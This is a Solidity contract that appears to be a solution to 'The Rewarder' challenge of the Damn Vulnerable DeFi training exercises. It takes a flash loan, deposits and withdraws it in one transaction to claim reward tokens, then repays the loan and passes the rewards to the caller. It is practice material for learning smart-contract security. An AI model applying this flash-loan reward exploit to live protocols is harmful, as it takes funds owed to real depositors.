
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
contract TheRewarderPoolAttacker {

    DamnValuableToken liqToken ;
    RewardToken rewToken; 
    FlashLoanerPool FLPool; 
    TheRewarderPool rewPool ;
    uint256 FLPoolBalance;
    address FLPoolAddr;
    
    constructor(address _liqToken, address _FLPool, address _rewToken, address _rewPool){
        liqToken = DamnValuableToken(_liqToken);
        FLPool = FlashLoanerPool(_FLPool);
        rewToken = RewardToken(_rewToken);
        rewPool = TheRewarderPool(_rewPool);

        FLPoolBalance = liqToken.balanceOf(_FLPool);
        liqToken.approve(_rewPool, liqToken.balanceOf(_FLPool));

        FLPoolAddr = _FLPool; 
    }
    function attack() external {

        FLPool.flashLoan(FLPoolBalance);
        rewToken.transfer(msg.sender, rewToken.balanceOf(address(this)));

    }

    function receiveFlashLoan(uint256 amount) external {
        
        rewPool.deposit(amount);
        rewPool.withdraw(amount);
        liqToken.transfer(FLPoolAddr, amount);

    }
}